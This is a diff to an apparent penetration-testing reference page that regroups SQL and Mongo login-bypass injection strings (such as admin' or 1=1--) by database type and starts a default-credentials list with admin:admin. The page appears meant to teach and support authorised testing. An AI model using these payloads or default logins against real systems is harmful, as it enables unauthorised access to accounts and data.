@@ -6,19 +6,38 @@ alts: [API-Pentesting]
 render_with_liquid: false
 ---
 
-## Use SQL Injections
+## SQL Injections
 
 ```
-admin'--
-admin'#
-admin' or 1=1--
 admin' or '1'='1
-admin' or 1=1#
 ```
+
+- **Microsoft, Oracle, PostgreSQL**
+
+    ```
+    admin'--
+    admin' or 1=1--
+    ```
+
+- **MySQL**
+
+    ```
+    admin'-- [need to add space after '--']
+    admin'#
+    admin' or 1=1#
+    ```
+
+- **Mongo**
+
+    ```
+    admin' || 1==1//
+    admin' || 1==1%00
+    admin' || '1==1
+    ```
 
 <br />
 
-## Use Default Credentials
+## Default Credentials
 
 ```sh
 admin:admin
